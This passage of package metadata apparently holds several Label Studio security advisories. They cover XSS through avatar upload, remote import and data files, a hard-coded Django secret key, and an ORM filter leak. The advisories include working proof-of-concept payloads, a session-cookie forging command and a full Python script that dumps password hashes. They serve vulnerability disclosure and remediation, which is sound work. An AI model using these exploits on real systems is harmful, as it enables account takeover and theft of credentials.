FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"1.10.0":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: Apache Software License","Operating System :: OS Independent","Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 